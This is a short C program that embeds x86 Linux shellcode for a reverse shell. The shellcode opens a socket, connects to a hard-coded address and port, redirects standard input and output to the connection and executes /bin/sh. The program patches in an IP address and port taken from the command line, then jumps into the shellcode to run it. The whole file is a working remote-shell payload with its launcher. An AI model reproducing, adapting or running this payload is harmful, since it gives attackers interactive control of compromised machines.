#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h> // inet_addr

#define IP_OFFSET 27
#define PORT_OFFSET 33

int main(int argc, char* argv[]) {
    unsigned char shellcode[] = \
"\x31\xdb\x31\xc9\x31\xd2\xf7\xe3\x31\xf6\x31\xff\xb3\x02\xb1\x01\xb2\x06\x66\xb8\x67\x01\xcd\x80\x89\xc3\x68\xc0\xa8\xca\x81\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\xb2\x10\x66\xb8\x6a\x01\xcd\x80\x31\xc9\xb1\x03\xfe\xc9\xf7\xe2\xb0\x3f\xcd\x80\xfe\xc1\xe2\xf4\x31\xc9\x66\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80";

    if (argc > 2) {
        printf("Addr: %s\n", argv[1]);
        in_addr_t ip = inet_addr(argv[1]);
        unsigned short porti = htons(atoi(argv[2]));
        memcpy(&shellcode[IP_OFFSET], &ip, 4);
        memcpy(&shellcode[PORT_OFFSET], &porti, 2);
    } else {
        printf("Please enter an IP address and port number!\n");
        printf("Usage: %s <ip-address> <port>\n\n", argv[0]);
        return -1;
    }

    printf("Shellcode Length:  %d\n", strlen(shellcode));

    int (*ret)() = (int(*)())shellcode;

    ret();
}
